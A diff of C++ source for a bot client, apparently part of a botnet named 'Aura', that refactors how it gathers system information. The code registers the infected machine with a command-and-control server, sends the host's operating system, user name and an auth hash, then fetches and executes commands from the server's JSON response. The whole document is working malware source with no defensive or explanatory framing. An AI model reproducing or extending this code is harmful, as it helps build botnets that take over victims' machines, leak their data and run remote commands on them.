@@ -1,12 +1,12 @@
+#include <iostream>
 #include <memory>
 #include <string>
 
 #include "command.hh"
 #include "installer.hh"
 #include "request.hh"
+#include "sysinfo.hh"
 #include "util.hh"
-
-const std::string HASH_TYPE("SHA256");
 
 class Bot {
    public:
@@ -18,17 +18,15 @@ class Bot {
 
    private:
     bool is_new_;
-    std::string hash_type_, hash_sum_, os_, user_;
     std::unique_ptr<Installer> install_;
-
-    void PrepareSysInfo_();
+    std::unique_ptr<sysinfo::DataList> sysinfo_;
 };
 
-// Initialize auth file and determine if bot is new
+// Initialize auth file and object to collect system info
 Bot::Bot(const std::string& install_dir) {
-    hash_type_ = HASH_TYPE;
     install_ = std::make_unique<Installer>(install_dir);
-    hash_sum_ = install_->GetAuthHash();
+    std::string auth_hash = install_->GetAuthHash();
+    sysinfo_ = std::make_unique<sysinfo::DataList>(auth_hash);
 }
 
 bool Bot::IsNew() { return install_->IsNew(); }
@@ -41,36 +39,17 @@ void Bot::Install() {
 
 // Register bot with C2 server
 void Bot::RegisterBot(const std::string& register_url) {
-    PrepareSysInfo_();
-    request::PostForm post_form;
-    post_form.AddField("version", AURA_VERSION);
-    post_form.AddField("hash_type", hash_type_);
-    post_form.AddField("hash_sum", hash_sum_);
-    post_form.AddField("operating_sys", os_);
-    post_form.AddField("user", user_);
-    request::Post(register_url, post_form.ToString());
+    // Create POST form from sysinfo_ and send it to C2 server
+    std::string data = sysinfo_->GetPostData();
+    request::Post(register_url, data);
 }
 
 void Bot::ExecuteCommand(const std::string& command_url) {
-    // Update system info and create POST form
-    PrepareSysInfo_();
-    request::PostForm post_form;
-    post_form.AddField("version", AURA_VERSION);
-    post_form.AddField("hash_sum", hash_sum_);
+    // Create POST form from sysinfo_ and send it to C2 server
+    std::string data = sysinfo_->GetPostData();
+    std::string response = request::Post(command_url, data);
 
-    std::string response = request::Post(command_url, post_form.ToString());
-
-    // Parse response from C2 server and execute based on JSON data
+    // Parse JSON response from C2 server and execute command
     Command cmd(response);
     cmd.Execute();
-}
-
-// Retrieve values if they haven't been already
-void Bot::PrepareSysInfo_() {
-    if (!(os_.size())) {
-        os_ = util::GetOS();
-    }
-    if (!(user_.size())) {
-        user_ = util::GetUser();
-    }
 }
